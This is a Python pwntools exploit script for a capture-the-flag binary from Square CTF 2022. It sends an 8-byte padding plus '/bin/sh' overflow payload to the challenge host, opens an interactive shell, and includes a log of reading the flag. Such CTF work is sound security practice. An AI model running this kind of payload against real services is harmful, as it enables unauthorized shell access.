#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn

BINARY = "ez-pwn-1"
LIBC = "/usr/lib/libc-2.32.so"
LD = "/lib64/ld-linux-x86-64.so.2"

# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF(BINARY)
libc = pwn.ELF(LIBC)
ld = pwn.ELF(LD)
pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32
p16 = pwn.p16
u16 = pwn.u16
p8  = pwn.p8
u8  = pwn.u8

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
continue
'''.format(**locals())

def exp():

    io = start()

    io.sendlineafter(b"directory?\n", b"A"*8 + b"/bin/sh\x00")

    io.interactive()

if __name__ == "__main__":
    exp()

"""
[root@(none) ez1]# python3 exploit.py REMOTE HOST=chals.2022.squarectf.com PORT=4100
[*] '/root/Documents/pwn/squareCTF/ez1/ez-pwn-1'
    Arch:     amd64-64-little
        RELRO:    Full RELRO
            Stack:    Canary found
                NX:       NX enabled
                    PIE:      PIE enabled
                    [*] '/usr/lib/libc-2.32.so'
                        Arch:     amd64-64-little
                            RELRO:    Full RELRO
                                Stack:    Canary found
                                    NX:       NX enabled
                                        PIE:      PIE enabled
                                        [*] '/lib64/ld-linux-x86-64.so.2'
                                            Arch:     amd64-64-little
                                                RELRO:    Full RELRO
                                                    Stack:    No canary found
                                                        NX:       NX enabled
                                                            PIE:      PIE enabled
                                                            [+] Opening connection to chals.2022.squarectf.com on port 4100: Done
                                                            [*] Switching to interactive mode
                                                            Ok, here ya go!

                                                            $ cat the_flag_is_in_here/flag.txt
                                                            flag{congrats_youve_exploited_a_memory_corruption_vulnerability}$  

"""
